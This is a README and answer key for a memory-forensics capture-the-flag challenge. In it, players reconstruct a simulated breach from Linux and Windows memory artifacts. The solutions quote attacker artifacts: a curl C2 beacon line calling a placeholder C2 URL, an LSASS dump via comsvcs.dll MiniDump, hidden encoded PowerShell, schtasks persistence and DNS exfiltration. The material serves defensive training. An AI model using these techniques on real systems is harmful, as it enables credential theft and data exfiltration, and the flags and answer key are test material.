# Romeo — DFIR Memory Forensics

**Status:** ✅ Complete

| Field | Value |
|-------|-------|
| **Name** | Romeo — DFIR Memory Forensics |
| **Type** | Digital Forensics & Incident Response |
| **Scenario** | Operation Midnight Raven |
| **Tiers** | Easy / Medium / Hard |
| **Total Points** | 4,050 |
| **Total Flags** | 11 |
| **Port** | 4020 |

## Player Description

EverSec SOC detected a three-day breach across three corporate workstations. The senior forensic analyst already ran the evidence collection — now it's your job to analyze what was found and reconstruct the attack.

Download the evidence archives from the case portal and answer the questions the SOC needs answered. What process was running from the wrong place? What credentials did they steal? How did they get the data out?

## Flags

### Easy Tier: "Patient Zero" (WS-RECEPTION-01) — 600 pts

Real Linux memory dump. Analyze with `strings`, `grep`, or Volatility 3.

| # | Flag | Points | Location |
|---|------|--------|----------|
| 1 | `susp1c10us_pr0c3ss_f0und` | 100 | Process command-line args |
| 2 | `p0w3rsh3ll_d3c0d3d` | 200 | Base64-encoded string in memory |
| 3 | `m4cr0_c2_c4llb4ck` | 300 | C2 callback URL token |

### Medium Tier: "Lateral Move" (WS-DEVOPS-01) — 1,450 pts

Pre-extracted Volatility 3 output from a Windows system. Extract the tar.gz and analyze.

| # | Flag | Points | Location |
|---|------|--------|----------|
| 1 | `4n0m4l0us_c0nn3ct10n` | 200 | `analyst-ioc-notes.txt` — callback identifier |
| 2 | `p3rs1st3nc3_d3t3ct3d` | 350 | `extracted/scheduled_task.xml` — Description element |
| 3 | `r3g1stry_4ut0run_f0und` | 400 | `vol3-printkey.txt` — Run key value (base64-decode the `-enc` param) |
| 4 | `cr3d3nt14l_dump_4n4lyz3d` | 500 | `extracted/lsass_strings.txt` — svc_deploy account password |

### Hard Tier: "Exfil and Burn" (WS-FINANCE-01) — 2,000 pts

Pre-extracted Volatility 3 output requiring decoding and cross-file analysis.

| # | Flag | Points | Location |
|---|------|--------|----------|
| 1 | `1nj3ct3d_sh3llc0d3_x0r` | 300 | `vol3-malfind.txt` — XOR key 0x42, injected region |
| 2 | `3xf1l_4rch1v3_r3c0v3r3d` | 450 | `extracted/staging/data.b64` — base64-decode, find filename |
| 3 | `t1m3st0mp_d3t3ct3d` | 550 | Cross-reference `vol3-timeliner.txt` vs `vol3-mftparser.txt` |
| 4 | `dns_3xf1l_r3c0nstruct3d` | 700 | `extracted/dns_queries.pcap.txt` — base32 subdomain labels |

---

## Setup

### Docker Compose (recommended)

```bash
docker compose up -d romeo-dfir-memdump
```

### Docker standalone

```bash
docker build -t romeo-dfir-memdump .
docker run -d -p 4020:80 --name ctf-romeo-dfir-memdump romeo-dfir-memdump
```

Then browse to `http://localhost:4020/` to download evidence archives.

### Rebuilding archives

If you need to regenerate the Medium/Hard archives (e.g., after changing flag values):

```bash
cd build-artifacts/
python3 generate_medium.py
python3 generate_hard.py
```

The Easy tier real memory dump must be recreated manually — see the "Easy Tier: Creating the Memory Dump" section below.

---

## Solutions

### Easy Tier — "Patient Zero"

**Setup**: Download `romeo-easy-patient-zero.raw.gz`. Decompress before analysis:
```bash
gunzip romeo-easy-patient-zero.raw.gz
# or decompress on the fly:
gunzip -c romeo-easy-patient-zero.raw.gz | strings | grep <pattern>
```

> **Note**: `strings | grep` is the primary analysis method for this tier.
> Volatility 3 (`linux.psaux`, etc.) requires a matching ISF kernel symbol file
> and will not work without one for this image.

#### FLAG 1 — `susp1c10us_pr0c3ss_f0und` (100 pts)

A suspicious process is running from `/tmp/` instead of a system directory — a classic IOC. Its command-line arguments contain the flag.

**strings + grep**:
```bash
strings romeo-easy-patient-zero.raw | grep "susp1c10us"
# or search for the binary name
strings romeo-easy-patient-zero.raw | grep "/tmp/svchost"
```

Both return the full command line showing the suspicious process and its `-config` argument.

**Flag**: `susp1c10us_pr0c3ss_f0und`

#### FLAG 2 — `p0w3rsh3ll_d3c0d3d` (200 pts)

A script running in memory contains a base64-encoded configuration string. Find the encoded value and decode it.

**Step 1 — Find the base64 string**:
```bash
strings romeo-easy-patient-zero.raw | grep "ENCODED_CONFIG"
# Returns the script line: ENCODED_CONFIG = "cDB3M3JzaDNsbF9kM2MwZDNk"
```

Or grep for the start of the base64 value directly:
```bash
strings romeo-easy-patient-zero.raw | grep "cDB3"
# Returns: ENCODED_CONFIG = "cDB3M3JzaDNsbF9kM2MwZDNk"
```

**Step 2 — Decode it**:
```bash
echo "cDB3M3JzaDNsbF9kM2MwZDNk" | base64 -d
# Returns: p0w3rsh3ll_d3c0d3d
```

**Flag**: `p0w3rsh3ll_d3c0d3d`

#### FLAG 3 — `m4cr0_c2_c4llb4ck` (300 pts)

Malware makes callbacks to a C2 server. The flag is embedded in the URL as a tracking token.

```bash
strings romeo-easy-patient-zero.raw | grep "token="
# Returns lines like:
#   curl -s -o /dev/null "${C2_URL}?bot=${BOT_ID}&token=m4cr0_c2_c4llb4ck&ts=$(date +%s)"
#   GET /check?bot=ws-reception-01-a1b2c3d4&token=m4cr0_c2_c4llb4ck&ts=1743739200 HTTP/1.1
```

The flag value is the `token=` parameter value.

**Flag**: `m4cr0_c2_c4llb4ck`

---

### Medium Tier — "Lateral Move"

**Setup**:
```bash
tar xzf romeo-medium-lateral-move.tar.gz
cd romeo-medium-lateral-move/
cat README-ANALYST.txt  # Read the briefing first
```

#### FLAG 1 — `4n0m4l0us_c0nn3ct10n` (200 pts)

Check network connections for suspicious outbound traffic and correlate with threat intel.

**Step 1 — Examine network scan output**:
```bash
cat vol3-netscan.txt | grep ESTABLISHED
# Note: svcnet.exe has two ESTABLISHED connections to 185.141.27.93:443
```

**Step 2 — Cross-reference threat intel**:
```bash
cat analyst-ioc-notes.txt | grep "Callback identifier"
# Returns: Callback identifier: 4n0m4l0us_c0nn3ct10n
```

**Key observation**: `svcnet.exe` (PID 3412) running from `C:\Users\d.kim\AppData\Local\Temp\` — wrong path for a system service. The process tree shows it spawned from `svchost.exe`, which spawned `cmd.exe` → `powershell.exe`.

**Flag**: `4n0m4l0us_c0nn3ct10n`

#### FLAG 2 — `p3rs1st3nc3_d3t3ct3d` (350 pts)

The attacker installed a scheduled task for persistence.

**Step 1 — Spot the suspicious scheduled task command**:
```bash
grep "schtasks" vol3-cmdline.txt
# Shows: schtasks /create /tn "Microsoft\Windows\NetTrace\GatherInfo" ...
```

**Step 2 — Examine the extracted task XML**:
```bash
cat extracted/scheduled_task.xml | grep -A2 Description
# Returns: <Description>p3rs1st3nc3_d3t3ct3d</Description>
```

**Flag**: `p3rs1st3nc3_d3t3ct3d`

#### FLAG 3 — `r3g1stry_4ut0run_f0und` (400 pts)

The attacker added a registry autorun entry. The value is obfuscated with PowerShell's `-enc` (base64 encoded command) parameter.

**Step 1 — Find the suspicious Run key**:
```bash
grep -A20 "CurrentVersion\\\\Run" vol3-printkey.txt
# Note the "WindowsNetTrace" value with "-enc" parameter
```

**Step 2 — Extract the base64 value**:
```bash
grep "WindowsNetTrace" vol3-printkey.txt
# ...powershell -w hidden -nop -enc <BASE64_HERE>
```

**Step 3 — Decode it**:
```bash
echo "<BASE64_VALUE>" | base64 -d
# Returns: r3g1stry_4ut0run_f0und
```

Or in Python:
```python
import base64
print(base64.b64decode("<BASE64_VALUE>").decode())
```

**Flag**: `r3g1stry_4ut0run_f0und`

#### FLAG 4 — `cr3d3nt14l_dump_4n4lyz3d` (500 pts)

The attacker dumped LSASS memory to harvest credentials (visible via `rundll32.exe comsvcs.dll MiniDump` in cmdline output). The extracted strings contain cleartext credentials.

```bash
cat extracted/lsass_strings.txt | grep -A5 "svc_deploy"
# Look for the wdigest Password field under svc_deploy
```

**Key finding**: Wdigest stores credentials in cleartext when enabled. The `svc_deploy` service account has cleartext password visible.

**Flag**: `cr3d3nt14l_dump_4n4lyz3d`

---

### Hard Tier — "Exfil and Burn"

**Setup**:
```bash
tar xzf romeo-hard-exfil-burn.tar.gz
cd romeo-hard-exfil-burn/
cat README-ANALYST.txt  # Read the briefing first
```

#### FLAG 1 — `1nj3ct3d_sh3llc0d3_x0r` (300 pts)

`vol3-malfind.txt` shows process injection — a private memory region with `PAGE_EXECUTE_READWRITE` permissions (legitimate code is `PAGE_EXECUTE_READ`). The injected shellcode contains a single-byte XOR-encoded string.

**Step 1 — Identify the suspicious region**:
```bash
grep -A5 "PAGE_EXECUTE_READWRITE" vol3-malfind.txt
# powershell.exe has injected code with XOR-encoded payload
```

**Step 2 — XOR decode the injected region**:

The note in `vol3-malfind.txt` identifies the XOR'd region as `0x0040001d-0x00400032` (22 bytes starting after the shellcode NOP sled). The hint lists candidate keys including `0x42`.

```python
import re

with open('vol3-malfind.txt') as f:
    content = f.read()

# Extract hex bytes ONLY from the powershell.exe region (0x00400000 lines)
hex_bytes = []
for line in content.split('\n'):
    m = re.match(r'(0x0040[0-9a-f]+)\s{2}((?:[0-9a-f]{2}\s)+)', line)
    if m:
        addr = int(m.group(1), 16)
        for i, h in enumerate(m.group(2).split()):
            hex_bytes.append((addr + i, int(h, 16)))

# Try XOR keys from the hint, look for printable flag-shaped output
for key in [0x41, 0x42, 0x43, 0x55, 0xAA, 0xFF]:
    decoded = ''.join(chr(b ^ key) if 32 <= (b ^ key) < 127 else '' for _, b in hex_bytes)
    if len(decoded) > 8 and '_' in decoded:
        print(f"Key 0x{key:02x}: {decoded}")
```

This produces readable output only for key `0x42`, revealing the flag embedded in the printable substring.

**Flag**: `1nj3ct3d_sh3llc0d3_x0r`

#### FLAG 2 — `3xf1l_4rch1v3_r3c0v3r3d` (450 pts)

The attacker used `certutil.exe` (visible in pslist/cmdline) to base64-encode a 7z archive for exfiltration. The encoded blob was recovered from the staging directory.

**Step 1 — Decode the base64 blob**:
```python
import base64
with open('extracted/staging/data.b64') as f:
    decoded = base64.b64decode(f.read())
print(decoded.decode())
```

Or with system `base64` (syntax varies by OS):
```bash
# Linux
base64 -d extracted/staging/data.b64
# macOS
base64 -D -i extracted/staging/data.b64
```

**Step 2 — Find the flag in the archive listing**:

The 7z listing shows the files staged for exfiltration. One "file" has the flag value as its filename.

**Flag**: `3xf1l_4rch1v3_r3c0v3r3d`

#### FLAG 3 — `t1m3st0mp_d3t3ct3d` (550 pts)

The attacker ran `timestomp.exe` (visible in pslist at 08:45:33) to alter file timestamps and cover tracks. Cross-referencing two timeline sources reveals the anomaly.

**Key concept**: NTFS stores timestamps in two places:
- `$STANDARD_INFORMATION` (SI) — user-visible timestamps, easily modified
- `$FILE_NAME` (FN) — updated by the OS on file creation/move, harder to fake

When an attacker modifies SI timestamps but not FN timestamps, the discrepancy is a reliable detection signal.

**Step 1 — Check timeliner for suspicious files**:
```bash
grep "drivers" vol3-timeliner.txt
# Shows: 2026-01-15 10:22:14 — Windows\System32\drivers\<FLAG>.sys
```

**Step 2 — Check MFT parser for the same file**:
```bash
grep "drivers" vol3-mftparser.txt
# $FILE_NAME entry shows Created: 2026-03-17 08:45:18 (real creation time)
# $STANDARD_INFORMATION shows: 2026-01-15 10:22:14 (backdated!)
```

**Step 3 — Identify the anomaly**:

The `$FILE_NAME` timestamp (2026-03-17 08:45:18) doesn't match the `$STANDARD_INFORMATION` timestamp (2026-01-15 10:22:14). The attacker backdated the file to January to make it look like a legitimate driver. The filename of the suspicious `.sys` file **is** the flag.

```bash
grep -i "sys" vol3-mftparser.txt | grep "drivers"
```

**Flag**: `t1m3st0mp_d3t3ct3d`

#### FLAG 4 — `dns_3xf1l_r3c0nstruct3d` (700 pts)

`nslookup.exe` (PID 4264) was making unusual DNS queries to an external server (91.215.85.120, not the internal DC). The subdomain labels are base32-encoded data chunks being exfiltrated covertly over DNS.

**Step 1 — Identify the suspicious queries**:
```bash
grep "midnightraven" extracted/dns_queries.pcap.txt
# Shows: <CHUNK>.<INDEX>.exfil.midnightraven.net TXT queries
```

**Step 2 — Extract and sort the subdomain labels**:
```bash
grep "midnightraven" extracted/dns_queries.pcap.txt | awk '{print $6}' | sort -t. -k2 -n
```

**Step 3 — Concatenate the chunks in order**:
```python
import re, base64

with open('extracted/dns_queries.pcap.txt') as f:
    lines = f.readlines()

chunks = {}
for line in lines:
    m = re.search(r'(\w+)\.(\d+)\.exfil\.midnightraven\.net', line)
    if m:
        chunks[int(m.group(2))] = m.group(1)

# Reconstruct in order
encoded = ''.join(chunks[k] for k in sorted(chunks))

# Base32 decode (pad to multiple of 8)
padding = (8 - len(encoded) % 8) % 8
decoded = base64.b32decode(encoded.upper() + '=' * padding)
print(decoded.decode())
```

**Flag**: `dns_3xf1l_r3c0nstruct3d`

---

## Easy Tier: Creating the Memory Dump

The Easy tier requires a real Linux memory dump. This section documents how to reproduce it.

### Prerequisites

- macOS with UTM (or any hypervisor: VirtualBox, VMware, QEMU)
- Alpine Linux Virtual ISO (downloaded from alpinelinux.org)

### Step-by-Step

**1. Create a minimal Alpine VM**
```
Hypervisor:  UTM (brew install --cask utm)
OS:          Alpine Linux 3.19 (Virtual/x86_64 ISO)
RAM:         128 MB
CPUs:        1
Disk:        2 GB
Network:     NAT
```

Install Alpine in "sys" mode:
```
setup-alpine   # Follow prompts, use defaults, disk = vda, sys mode
reboot
```

**2. Install prerequisites in the VM**
```sh
apk add python3 curl ncat-nmap procps
```

**3. Download AVML (userspace memory acquisition — no kernel module needed)**
```sh
# In the Alpine VM
wget https://github.com/microsoft/avml/releases/download/v0.13.0/avml
chmod +x avml
```

**4. Run the attack simulation script**
```sh
# Copy simulate_attack.sh to the VM (via SSH or shared folder)
sh simulate_attack.sh
```

Wait for the script to confirm all processes are running.

**5. Capture memory (in a second terminal, while simulate_attack.sh is still running)**
```sh
sudo ./avml memdump.raw
```

**6. Verify the flags are present**
```sh
strings memdump.raw | grep "susp1c10us_pr0c3ss_f0und"
strings memdump.raw | grep "cDB3M3JzaDNsbF9kM2MwZDNk"
strings memdump.raw | grep "token=m4cr0_c2"
```

**7. Compress and copy to the repo**
```sh
gzip -9 memdump.raw
# Copy memdump.raw.gz to Challenges/romeo-dfir-memdump/files/romeo-easy-patient-zero.raw.gz
```

**Expected size**: ~15–40 MB compressed (from 128 MB raw dump).

### Volatility 3 Profile (optional)

Players using Volatility 3 need an ISF symbol file for the kernel. To generate it:

```sh
# In the Alpine VM
apk add linux-virt-dev  # kernel headers
pip3 install dwarf2json
dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-virt > alpine-virt.json
```

Include `alpine-virt.json` alongside the dump if you want Volatility to work fully. Players using just `strings | grep` don't need it.

---

## Learning Objectives

### Easy Tier
- Identify processes running from anomalous paths (`/tmp/`, `AppData\Temp\`)
- Decode base64-encoded payloads in memory
- Recognize C2 callback patterns in memory artifacts

### Medium Tier
- Correlate network connections with threat intelligence feeds
- Detect scheduled task persistence mechanisms
- Analyze registry autorun modifications
- Extract credentials from LSASS memory dumps (Mimikatz output)

### Hard Tier
- Detect code injection via memory protection flags (`PAGE_EXECUTE_READWRITE`)
- Decode XOR-obfuscated shellcode
- Recover staged exfiltration data (base64-encoded archives)
- Detect timestomping by comparing `$STANDARD_INFORMATION` vs `$FILE_NAME` MFT attributes
- Reconstruct DNS exfiltration channels from query logs

---

## Tools Reference

| Tool | Use |
|------|-----|
| `strings` | Extract printable strings from binary/memory files |
| `grep` | Search strings output for specific patterns |
| `base64 -d` | Decode base64-encoded strings |
| `python3` | XOR decoding, base32 reconstruction, general scripting |
| `CyberChef` | Browser-based encoding/decoding (web: gchq.github.io/CyberChef) |
| `tar xzf` | Extract .tar.gz archives |
| `gunzip` / `gzip -d` | Decompress .gz files |
| Volatility 3 | Full memory image analysis (Easy tier, requires ISF) |

---

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1 — Easy Tier (Patient Zero)</summary>

Memory dumps are binary files, but they contain a lot of embedded human-readable text. What standard Unix utility extracts readable strings from binary files? What keywords — process names, file paths, encoded blobs, network indicators — would suggest attacker activity?

</details>

<details>
<summary>Hint 2 — Medium Tier (Lateral Move)</summary>

The Volatility output files each capture a different aspect of system state. Effective incident response means correlating across sources — an IP in the network scan might appear elsewhere too. What data structures do attackers commonly abuse for persistence on Windows?

</details>

<details>
<summary>Hint 3 — Hard Tier (Exfil and Burn)</summary>

Single-byte XOR is a classic obfuscation technique — work through the hex systematically. For the DNS exfiltration, attackers encode data and split it across many queries with sequence information embedded. How would you reassemble the original payload?

</details>

## Prevention / Remediation

### Attack Techniques Used in This Challenge

| Technique | MITRE ATT&CK | Prevention |
|-----------|-------------|------------|
| Process injection (malfind) | T1055 | EDR behavioral detection, process integrity monitoring |
| Scheduled task persistence | T1053.005 | Audit scheduled task creation events (Event ID 4698) |
| Registry Run key | T1547.001 | Monitor HKLM/HKCU Run key writes |
| LSASS credential dumping | T1003.001 | Credential Guard, Protected Users group, PPL for LSASS |
| DNS exfiltration | T1071.004 | DNS monitoring, anomalous subdomain length detection |
| Timestomping | T1070.006 | Hash-based file integrity monitoring, MFT analysis |
| Base64-encoded payloads | T1027 | Script block logging, AMSI, behavioral detection |
| C2 over HTTPS | T1071.001 | TLS inspection, DNS blocklists, network anomaly detection |
